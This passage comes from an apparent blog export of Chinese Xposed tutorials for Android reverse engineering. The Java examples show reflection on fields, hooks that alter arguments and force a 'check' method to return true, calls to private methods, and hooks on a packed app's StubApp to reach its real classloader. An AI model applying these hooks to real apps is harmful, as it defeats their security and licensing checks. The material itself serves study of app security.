class="line"><span class="comment">	Xposed默认就修改了访问权限为true  setAccessible(true);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//setStaticObjectField(java.lang.Class&lt;?&gt; clazz, java.lang.String fieldName, java.lang.Object value)</span></span><br><span class="line">XposedHelpers.setStaticObjectField(stuClass,<span class="string">&quot;teacher&quot;</span>,<span class="string">&quot;teacher888&quot;</span>);</span><br><span class="line">String teachername2= (String) XposedHelpers.getStaticObjectField(stuClass,<span class="string">&quot;teacher&quot;</span>);</span><br><span class="line">XposedBridge.log(<span class="string">&quot;XposedHelpers.getStaticObjectField-&gt;&quot;</span>+teachername2);</span><br></pre></td></tr></table></figure>

<p>动态属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	也可以使用反射修改动态属性，这个需要的是在AfterHookedMethod方法中进行反射来对其进行修改</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">      <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">    <span class="comment">//获取对象，获取构造函数产生的对象，就是相当于实列化了对象</span></span><br><span class="line">      <span class="type">Object</span> <span class="variable">thisobj</span> <span class="operator">=</span> param.thisObject;</span><br><span class="line">    <span class="comment">//反射</span></span><br><span class="line">      Field nicknameField=stuClass.getDeclaredField(<span class="string">&quot;nickname&quot;</span>);</span><br><span class="line">      XposedBridge.log(stuClass+<span class="string">&quot;--nicknameField-&gt;&quot;</span>+nicknameField);</span><br><span class="line">      nicknameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      nicknameField.set(thisobj,<span class="string">&quot;bear&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//public static void setObjectField(Object obj, String fieldName, Object value)</span></span><br><span class="line">    XposedHelpers.setObjectField(thisobj,<span class="string">&quot;nickname&quot;</span>,<span class="string">&quot;chick&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="hook-method"><a href="#hook-method" class="headerlink" title="hook method"></a>hook method</h1><p>一般类的函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	都是通过XposedHelpers的下面两个方法来进行hook</span></span><br><span class="line"><span class="comment">	public static Unhook findAndHookMethod(Class&lt;?&gt; clazz, String methodName, Object... parameterTypesAndCallback)</span></span><br><span class="line"><span class="comment">	public static Unhook findAndHookMethod(String className, ClassLoader classLoader, String methodName, Object... parameterTypesAndCallback)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">            XposedHelpers.findAndHookMethod(<span class="string">&quot;com.kanxue.xposedflag.Flag2&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;check&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                    Object[] paramArgsArray = param.args;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> (String) paramArgsArray[<span class="number">0</span>];</span><br><span class="line">                    <span class="comment">//直接修改参数</span></span><br><span class="line">                    paramArgsArray[<span class="number">0</span>] = <span class="string">&quot;modified param!&quot;</span></span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;check(String). beforeHookedMethod---&quot;</span>+content);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;check(String) ：enter afterHookedMethod---&quot;</span>+param.getResult());</span><br><span class="line">                    <span class="comment">//修改返回值</span></span><br><span class="line">                    param.setResult(<span class="literal">true</span>);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;check(String)：afterHookedMethod---&quot;</span>+param.getResult());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br></pre></td></tr></table></figure>

<p>hook 内部类的函数：</p>
<blockquote>
<p> 找到类名或者使用类名的时候记得加上$</p>
</blockquote>
<p>hook 匿名内部类：$1,$2…</p>
<blockquote>
<p>将dex文件拖到GDA中就可以得到，</p>
</blockquote>
<p>hook JNI函数：</p>
<blockquote>
<p>只用把函数名修改为Java里面声明的函数名即可，其className也是声明 jni函数的类名</p>
</blockquote>
<h1 id="主动调用"><a href="#主动调用" class="headerlink" title="主动调用"></a>主动调用</h1><p>通过Java反射来进行主动调用，注意，静态方法可以直接通过类名来进行调用，而动态方法需要先实列化对象之后才能进行主动调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;com.kanxue.xposedhook01&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  public static String publicstaticfunc(String arg1, int arg2)*/</span></span><br><span class="line"></span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> loadPackageParam.classLoader;</span><br><span class="line">            Class&lt;?&gt; studentClazz = classLoader.loadClass(<span class="string">&quot;com.kanxue.xposedhook01.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">publicstaticfunc</span> <span class="operator">=</span> studentClazz.getDeclaredMethod(<span class="string">&quot;publicstaticfunc&quot;</span>,String.class,<span class="type">int</span>.class);</span><br><span class="line">            <span class="type">String</span> <span class="variable">publicstaticfuncResult</span> <span class="operator">=</span> (String) publicstaticfunc.invoke(<span class="literal">null</span>,<span class="string">&quot;args1&quot;</span>,<span class="number">200</span>);</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;publicstaticfunc was invoked--&quot;</span>+publicstaticfuncResult);</span><br><span class="line"><span class="comment">/*          private static String privatestaticfunc(String arg1, int arg2) */</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">privatestaticfunc</span> <span class="operator">=</span> studentClazz.getDeclaredMethod(<span class="string">&quot;privatestaticfunc&quot;</span>,String.class,<span class="type">int</span>.class);</span><br><span class="line">            privatestaticfunc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">privatestaticfuncResult</span> <span class="operator">=</span> (String) privatestaticfunc.invoke(<span class="literal">null</span>,<span class="string">&quot;privatestaticfunc&quot;</span>,<span class="number">300</span>);</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;privatestaticfunc was invoked--&quot;</span>+privatestaticfuncResult);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*         public String publicfunc(String arg1, int arg2) </span></span><br><span class="line"><span class="comment">            public Student(String name, String id) */</span></span><br><span class="line">            <span class="comment">//非静态的方法如果要主动调用的话，需要先获取到他的实列：可以通过反射获取构造方法，然后调用构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">studentConstructor</span> <span class="operator">=</span> studentClazz.getConstructor(String.class,String.class);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">studentInstance</span> <span class="operator">=</span> studentConstructor.newInstance(<span class="string">&quot;InstanceByReflection&quot;</span>, <span class="string">&quot;50&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">publicfunc</span> <span class="operator">=</span> studentClazz.getDeclaredMethod(<span class="string">&quot;publicfunc&quot;</span>,String.class,<span class="type">int</span>.class);</span><br><span class="line">            <span class="type">String</span> <span class="variable">publicfuncResult</span> <span class="operator">=</span> (String) publicfunc.invoke(studentInstance,<span class="string">&quot;publicfunc&quot;</span>,<span class="number">400</span>);</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;publicfunc was invoked:&quot;</span>+publicfuncResult);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*            private String privatefunc(String arg1, int arg2) */</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">privatefunc</span> <span class="operator">=</span> studentClazz.getDeclaredMethod(<span class="string">&quot;privatefunc&quot;</span>,String.class,<span class="type">int</span>.class);</span><br><span class="line">            privatefunc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">privatefuncResult</span> <span class="operator">=</span> (String) privatefunc.invoke(studentInstance,<span class="string">&quot;privatefunc&quot;</span>,<span class="number">500</span>);</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;privatefunc was invoked:&quot;</span>+privatefuncResult);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>通过xposed API来调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*            </span></span><br><span class="line"><span class="comment">	XposedHelpers有四个调用函数的方法：其区别是前两个是调用非静态函数，需要先获取对象</span></span><br><span class="line"><span class="comment">	public static Object callMethod(Object obj, String methodName, Object... args)</span></span><br><span class="line"><span class="comment">	public static Object callMethod(Object obj, String methodName, Class&lt;?&gt;[] parameterTypes, Object... args)</span></span><br><span class="line"><span class="comment">	public static Object callStaticMethod(Class&lt;?&gt; clazz, String methodName, Object... args)</span></span><br><span class="line"><span class="comment">	public static Object callStaticMethod(Class&lt;?&gt; clazz, String methodName, Class&lt;?&gt;[] parameterTypes, Object... args) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//两种函数都可以实现目标，并且这里并不分静态非静态，因为源码里面都设置了true</span></span><br><span class="line">	<span class="type">String</span> <span class="variable">publicstaticfuncresult</span> <span class="operator">=</span> (String) XposedHelpers.callStaticMethod(studentClazz,<span class="string">&quot;publicstaticfunc&quot;</span>,<span class="string">&quot;publicstaticfunc by xposed &quot;</span>,<span class="number">10</span>);</span><br><span class="line">XposedBridge.log(<span class="string">&quot;publicstaticfunc by xposed:---&quot;</span>+publicstaticfuncresult);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; parameterTypes[] = &#123;String.class,<span class="type">int</span>.class&#125;;</span><br><span class="line"><span class="type">String</span> <span class="variable">publicstaticfuncresult2</span> <span class="operator">=</span> (String) XposedHelpers.callStaticMethod(studentClazz,<span class="string">&quot;publicstaticfunc&quot;</span>,parameterTypes,<span class="string">&quot;publicstaticfunc  by xposed parameterTypes&quot;</span>,<span class="number">11</span>);</span><br><span class="line">XposedBridge.log(<span class="string">&quot;publicstaticfunc by xposed parameterTypes:---&quot;</span>+publicstaticfuncresult2);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	实列化对象的两个方式</span></span><br><span class="line"><span class="comment">	public static Object newInstance(Class&lt;?&gt; clazz, Object... args)</span></span><br><span class="line"><span class="comment">    public static Object newInstance(Class&lt;?&gt; clazz, Class&lt;?&gt;[] parameterTypes, Object... args)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> XposedHelpers.newInstance(studentClazz, <span class="string">&quot;XposedHelpers.newInstance&quot;</span>, <span class="string">&quot;20&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">publicfuncresult</span> <span class="operator">=</span> (String) XposedHelpers.callMethod(instance,<span class="string">&quot;publicfunc&quot;</span>,<span class="string">&quot;XposedHelpers.callMethod publicfunc&quot;</span>,<span class="number">30</span>);</span><br><span class="line">XposedBridge.log(<span class="string">&quot;XposedHelpers.callMethod publicfunc---&quot;</span>+publicfuncresult);</span><br></pre></td></tr></table></figure>

<p>也可以hook该类中的一个非静态的函数，就会得到一个对象，然后就能够得到对象，进行相关的函数调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(<span class="string">&quot;className&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;privateFunc&quot;</span>, String.class, <span class="type">int</span>.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> param.thisObject;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p>xposed: <a href="https://repo.xposed.info/module/de.robv.android.xposed.installer">https://repo.xposed.info/module/de.robv.android.xposed.installer</a></p>
<p>edxposed: <a href="https://github.com/ElderDrivers/EdXposed">https://github.com/ElderDrivers/EdXposed</a></p>
<p>FART：<a href="https://bbs.pediy.com/thread-252630.htm">https://bbs.pediy.com/thread-252630.htm</a></p>
]]></content>
      <categories>
        <category>Android安全</category>
        <category>Xposed</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
        <tag>Xposed</tag>
      </tags>
  </entry>
  <entry>
    <title>Xposed基础二</title>
    <url>/2022/06/02/Xposed%E5%9F%BA%E7%A1%80%E4%BA%8C/</url>
    <content><![CDATA[<h1 id="对加壳app的hook"><a href="#对加壳app的hook" class="headerlink" title="对加壳app的hook"></a>对加壳app的hook</h1><p>对于加了壳的app，我们只能够在程序自己执行到了正确的classloader的时候才能够进行hook,否则会出现找不到类的错误。</p>
<p>一般来说，app的application类的attachBaseContext函数和oncreate函数是用来解壳的， 经过了者两个函数，壳就会自动解密，所以在这里hook oncreate函数来找到目标app真正的类的class loader就能够找到。</p>
<ol>
<li>hook app的oncreate函数：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">     Log.i(<span class="string">&quot;xposed01:&quot;</span>, loadPackageParam.packageName);</span><br><span class="line">     XposedBridge.log(<span class="string">&quot;packagename&quot;</span> + loadPackageParam.packageName);</span><br><span class="line">     <span class="keyword">if</span> (loadPackageParam.packageName.equals(<span class="string">&quot;target package name&quot;</span>)) &#123;</span><br><span class="line">         XposedBridge.log(<span class="string">&quot;hooked target: &quot;</span> + loadPackageParam.packageName);</span><br><span class="line">         <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> loadPackageParam.classLoader;</span><br><span class="line"></span><br><span class="line">         XposedBridge.log(<span class="string">&quot;loadPackageParam.classLoader-&gt;&quot;</span> + classLoader);</span><br><span class="line"></span><br><span class="line"><span class="comment">//开始hook目标app的 onCreate函数</span></span><br><span class="line">         Class StubAppClass= XposedHelpers.findClass(<span class="string">&quot;com.stub.StubApp&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">         <span class="comment">//hook oncreate</span></span><br><span class="line">         XposedHelpers.findAndHookMethod(<span class="string">&quot;com.stub.StubApp&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                 <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                 XposedBridge.log(<span class="string">&quot;com.stub.StubApp-&gt;onCreate beforeHookedMethod&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                 <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                 XposedBridge.log(<span class="string">&quot;com.stub.StubApp-&gt;onCreate afterHookedMethod&quot;</span>);</span><br><span class="line">                 <span class="comment">//获取加载student的真正的classloader，当oncreate调用结束之后，就可以找到真正的classLoader了</span></span><br><span class="line">                 ClassLoader finalClassLoader=getClassloader();</span><br><span class="line">                 XposedBridge.log(<span class="string">&quot;finalClassLoader-&gt;&quot;</span> + finalClassLoader); </span><br><span class="line">                 </span><br><span class="line">                 <span class="comment">//找到了阵阵的classloader之后，就可以在这里对未加壳的app来进行hook了</span></span><br><span class="line">                 XposedHelpers.findAndHookMethod(<span class="string">&quot;target class&quot;</span>, finalClassLoader, <span class="string">&quot;privatefunc&quot;</span>, String.class, <span class="type">int</span>.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                     <span class="meta">@Override</span></span><br><span class="line">                     <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                         <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                         Object[] objectarray = param.args;</span><br><span class="line">                         <span class="type">String</span> <span class="variable">arg0</span> <span class="operator">=</span> (String) objectarray[<span class="number">0</span>];</span><br><span class="line">                         <span class="type">int</span> <span class="variable">arg1</span> <span class="operator">=</span> (<span class="type">int</span>) objectarray[<span class="number">1</span>];</span><br><span class="line">                         XposedBridge.log(<span class="string">&quot;beforeHookedMethod11 privatefunc-&gt;arg0:&quot;</span> + arg0 + <span class="string">&quot;---arg1:&quot;</span> + arg1);</span><br><span class="line"></span><br><span class="line">                     &#125;</span><br><span class="line">                     <span class="meta">@Override</span></span><br><span class="line">                     <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                         <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line"></span><br><span class="line">                         <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String) param.getResult();</span><br><span class="line">                         XposedBridge.log(<span class="string">&quot;afterHookedMethod11 privatefunc-&gt;result:&quot;</span> + result);</span><br><span class="line"></span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>然后再oncreate函数执行结束的时候，来找到真正的classloader</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ClassLoader <span class="title function_">getClassloader</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">resultClassloader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">currentActivityThread</span> <span class="operator">=</span> invokeStaticMethod(</span><br><span class="line">            <span class="string">&quot;android.app.ActivityThread&quot;</span>, <span class="string">&quot;currentActivityThread&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">mBoundApplication</span> <span class="operator">=</span> getFieldOjbect(</span><br><span class="line">            <span class="string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread,</span><br><span class="line">            <span class="string">&quot;mBoundApplication&quot;</span>);</span><br><span class="line">    <span class="type">Application</span> <span class="variable">mInitialApplication</span> <span class="operator">=</span> (Application) getFieldOjbect(<span class="string">&quot;android.app.ActivityThread&quot;</span>,</span><br><span class="line">            currentActivityThread, <span class="string">&quot;mInitialApplication&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">loadedApkInfo</span> <span class="operator">=</span> getFieldOjbect(</span><br><span class="line">            <span class="string">&quot;android.app.ActivityThread$AppBindData&quot;</span>,</span><br><span class="line">            mBoundApplication, <span class="string">&quot;info&quot;</span>);</span><br><span class="line">    <span class="type">Application</span> <span class="variable">mApplication</span> <span class="operator">=</span> (Application) getFieldOjbect(<span class="string">&quot;android.app.LoadedApk&quot;</span>, loadedApkInfo, <span class="string">&quot;mApplication&quot;</span>);</span><br><span class="line">    resultClassloader = mApplication.getClassLoader();</span><br><span class="line">    <span class="keyword">return</span> resultClassloader;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>最后就需要再HookonCreate函数的afterHookedMethod函数里面对其他类进行正常的hook即可</li>
</ol>
<p>其他有用的函数（比如得到类的所有属性，函数等）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getClassField</span><span class="params">(ClassLoader classloader, String class_name,</span></span><br><span class="line"><span class="params">                                  String filedName)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">obj_class</span> <span class="operator">=</span> classloader.loadClass(class_name);<span class="comment">//Class.forName(class_name);</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj_class.getDeclaredField(filedName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getClassFieldObject</span><span class="params">(ClassLoader classloader, String class_name, Object obj,</span></span><br><span class="line"><span class="params">                                         String filedName)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">obj_class</span> <span class="operator">=</span> classloader.loadClass(class_name);<span class="comment">//Class.forName(class_name);</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj_class.getDeclaredField(filedName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        result = field.get(obj);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">invokeStaticMethod</span><span class="params">(String class_name,</span></span><br><span class="line"><span class="params">                                        String method_name, Class[] pareTyple, Object[] pareVaules)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">obj_class</span> <span class="operator">=</span> Class.forName(class_name);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> obj_class.getMethod(method_name, pareTyple);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="literal">null</span>, pareVaules);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldOjbect</span><span class="params">(String class_name, Object obj,</span></span><br><span class="line"><span class="params">                                    String filedName)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">obj_class</span> <span class="operator">=</span> Class.forName(class_name);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj_class.getDeclaredField(filedName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ClassLoader <span class="title function_">getClassloader</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">resultClassloader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">currentActivityThread</span> <span class="operator">=</span> invokeStaticMethod(</span><br><span class="line">            <span class="string">&quot;android.app.ActivityThread&quot;</span>, <span class="string">&quot;currentActivityThread&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">mBoundApplication</span> <span class="operator">=</span> getFieldOjbect(</span><br><span class="line">            <span class="string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread,</span><br><span class="line">            <span class="string">&quot;mBoundApplication&quot;</span>);</span><br><span class="line">    <span class="type">Application</span> <span class="variable">mInitialApplication</span> <span class="operator">=</span> (Application) getFieldOjbect(<span class="string">&quot;android.app.ActivityThread&quot;</span>,</span><br><span class="line">            currentActivityThread, <span class="string">&quot;mInitialApplication&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">loadedApkInfo</span> <span class="operator">=</span> getFieldOjbect(</span><br><span class="line">            <span class="string">&quot;android.app.ActivityThread$AppBindData&quot;</span>,</span><br><span class="line">            mBoundApplication, <span class="string">&quot;info&quot;</span>);</span><br><span class="line">    <span class="type">Application</span> <span class="variable">mApplication</span> <span class="operator">=</span> (Application) getFieldOjbect(<span class="string">&quot;android.app.LoadedApk&quot;</span>, loadedApkInfo, <span class="string">&quot;mApplication&quot;</span>);</span><br><span class="line">    resultClassloader = mApplication.getClassLoader();</span><br><span class="line">    <span class="keyword">return</span> resultClassloader;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">GetClassLoaderClasslist</span><span class="params">(ClassLoader classLoader)</span> &#123;</span><br><span class="line">    <span class="comment">//private final DexPathList pathList;</span></span><br><span class="line">    <span class="comment">//public static java.lang.Object getObjectField(java.lang.Object obj, java.lang.String fieldName)</span></span><br><span class="line">    